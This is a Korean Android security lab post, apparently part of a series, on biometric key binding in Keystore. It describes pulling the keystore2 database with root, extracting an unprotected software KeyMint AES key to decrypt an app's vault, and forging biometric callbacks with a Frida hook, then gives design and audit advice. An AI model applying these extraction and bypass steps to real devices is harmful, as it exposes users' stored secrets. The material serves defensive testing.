`k_timeout`은 이번에는 자기 프롬프트 없이 `init`과 `doFinal`을 모두 통과했다. 방금 timeout 해제 때 받은 지문 인증이 30초 동안 이 키에도 유효했다. `k_auth`는 같은 순간에도 실패했다. 매번 인증 키는 operation마다 challenge가 달라서 다른 인증을 빌려 쓰지 못한다. 타임아웃 키를 CryptoObject 없이 쓰면 "인증 후 30초 안에 앱 프로세스가 무엇을 하든 키가 열린다"는 뜻이 된다. 앱이 프롬프트 없이 키를 쓴 이 probe와 같은 방식이므로, 그 창 안에서 Frida로 앱 코드를 돌려도 키가 쓰일 것이다(직접 돌려 보지는 않았다).

## 루트로 keystore2 데이터베이스를 열어 보면

`getEncoded()`가 null인 키가 디스크에서는 어떤 모습인지 보려고, 루트 권한으로 keystore2 데이터베이스와 앱의 `vault.xml`을 호스트로 가져왔다. userdebug 에뮬레이터라 `adb pull /data/misc/keystore/persistent.sqlite`가 그대로 됐고 `-wal` 파일은 없었다. 이 DB를 읽어 앱 UID의 키마다 keystore2가 기록한 태그와 KeyMint 블롭을 보여 주는 `keyblob.py`를 짰다. 블롭이 keystore2 수준에서 암호화되지 않은 소프트웨어 KeyMint 블롭이면 AES 키를 꺼내 vault를 호스트에서 복호해 본다.

![adb pull로 persistent.sqlite와 vault.xml을 받고 python keyblob.py를 실행한 터미널. k_timeout과 k_auth는 USER_SECURE_ID가 있고 blob metadata에 EncryptedBy, Iv, AeadTag, KmUuid가 있어 super-encrypted, vault 복호는 InvalidTag. k_noauth는 NO_AUTH_REQUIRED=None, metadata KmUuid뿐인 software KeyMint blob version 0에서 32바이트 키 ff2ef611...가 나오고 vault k_noauth.ct decrypted on the host: vault-token=seika-4417](/assets/img/android-mastery/p1c14/08-keyblob.png)

인증 없는 `k_noauth`의 블롭은 버전 바이트 0, 길이, 키 재료 순서의 평문 구조였다. 소프트웨어 KeyMint가 블롭을 만드는 [`integrity_assured_key_blob.cpp` 89~92행](https://android.googlesource.com/platform/system/keymaster/+/refs/tags/android-13.0.0_r84/key_blob_utils/integrity_assured_key_blob.cpp#89) 그대로다. 거기서 32바이트 AES 키가 나왔고 그 키로 호스트에서 `vault-token=seika-4417`이 복호됐다. 이 기기에서 `bool`과 `crypto-noauth` 설계는 루트 권한만 있으면 후킹 없이 `persistent.sqlite`와 `vault.xml` 두 파일로 풀린다.

`k_auth`와 `k_timeout`의 블롭에는 `EncryptedBy`, `Iv`, `AeadTag` 메타데이터가 붙어 있었고, 같은 방식으로 키 재료를 꺼내 vault에 대 보면 `InvalidTag`로 실패했다. keystore2가 KeyMint 블롭을 한 번 더 감싼 것이다.

![keystore2 enforcements.rs 752~787행 super_encryption_required. KEY_FLAG_AUTH_BOUND_WITHOUT_CRYPTOGRAPHIC_LSKF_BINDING 플래그가 있으면 None, 키 파라미터에 UserSecureID가 있고 Domain::APP이면 SuperEncryptionType::LskfBound 후보를 고른다](/assets/img/android-mastery/p1c14/23-src-superenc.png)

[`super_encryption_required`](https://android.googlesource.com/platform/system/security/+/refs/tags/android-13.0.0_r84/keystore2/src/enforcements.rs#758)는 앱 도메인 키에 `UserSecureID` 태그가 있으면 `LskfBound`, 곧 잠금 화면 자격 증명(LSKF)에서 유도한 키로 감싸 둔 super key로 블롭을 암호화한다고 정한다. super key 자체는 무작위로 만든 AES-256 키다([`super_key.rs`](https://android.googlesource.com/platform/system/security/+/refs/tags/android-13.0.0_r84/keystore2/src/super_key.rs)). `setUserAuthenticationRequired(true)`는 사용 시점의 인증 요구와 별개로 저장 시점의 보호도 하나 더 얹는 셈이다. 이 기기에서 인증 키를 지키는 것은 잠금 화면 PIN에서 유도한 키로 감싼 super key이고, 하드웨어는 관여하지 않는다. 이번에 확인한 범위는 "DB 파일만으로는 키가 안 나온다"까지다. 기기가 잠금 해제된 상태에서 메모리에 있는 super key를 꺼내는 시도는 하지 않았다. TEE가 있는 실기기라면 KeyMint 블롭 자체가 TEE 밖에서 풀리지 않으므로 `k_noauth`도 이렇게 읽히지 않아야 하지만, 이 환경에는 TEE가 없어 측정하지 못했다.

## 생체 인증으로 무언가를 지키려면

실험에서 버틴 설계는 하나뿐이었다. 지킬 동작에 필요한 키를 `setUserAuthenticationRequired(true)`와 `setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)`로 만들고, 그 키로 초기화한 Cipher(또는 Signature, Mac)를 CryptoObject로 넘기고, 콜백에서 돌려받은 객체로 실제 연산을 하는 설계다. 성공 콜백에서는 돌려받은 객체로 한 연산의 결과만 쓴다. 인증 타입은 Class 3이어야 하고, 자격 증명도 함께 허용하려면 API 30 이상이어야 한다. 타임아웃 키를 쓰면 앞의 probe에서 본 것처럼 30초 창 안에서는 앱 코드가 프롬프트 없이 키를 쓰므로, 앱 프로세스를 장악한 공격자도 그 창 안에서는 키를 쓸 수 있을 것이다.

이 키도 막는 범위가 정해져 있다. 이번 실험에서 막힌 것은 "클라이언트 콜백을 위조해 그 키로 하는 암호 연산"이다. 키가 지키는 동작이 서버 API라면 서버가 그 키로 만든 서명이나 그 키로만 풀리는 값을 확인해야 한다. 그러지 않으면 공격자는 키를 건드리지 않고 그다음 단계의 서버 호출을 그냥 보낸다. 서명 키라면 키 증명([Key attestation](/posts/android-concept-atlas-c42-key-attestation/))으로 그 키가 실제로 인증 결속 옵션으로 만들어졌는지도 서버에서 확인할 수 있다. 이 에뮬레이터의 증명은 소프트웨어 증명이라 이번 실험에서는 다루지 않았다.

점검할 때는 먼저 위의 apktool 출력처럼 앱이 어느 `authenticate` 오버로드를 부르는지, `setUserAuthentication*` 호출이 있는지를 grep한다. 키 속성은 `KeyInfo`의 `userAuthRequired`, `timeout`, `authType`, `securityLevel`로 보고, 루팅 기기라면 keystore2 DB `keyparameter`의 `USER_SECURE_ID`와 `AUTH_TIMEOUT` 태그로 같은 걸 확인한다. 그다음 `bypass.js`로 콜백을 위조해 `Key user not authenticated`가 나오는지, 같은 시점 logcat에 `AuthSession: addAuthToken` 줄이 없는지 보고, 실제 지문으로 같은 흐름이 열리는지 대조해 실패가 설계 때문인지 앱 버그 때문인지 가른다. 회귀 테스트로는 이 마지막 두 실행을 한 쌍으로 묶어 훅 아래에서는 -26, 실제 지문에서는 `UNLOCKED`가 찍히는지 함께 검사한다.

참고: [Android Keystore 시스템](https://developer.android.com/privacy-and-security/keystore), [생체 인증 대화상자 표시](https://developer.android.com/identity/sign-in/biometric-auth), [AOSP 생체 인식 보안 등급](https://source.android.com/docs/security/features/biometric)

*다음 글: [Activity·Intent 주입 실습](/posts/android-lab-p1c15-activity-intent-injection/)*
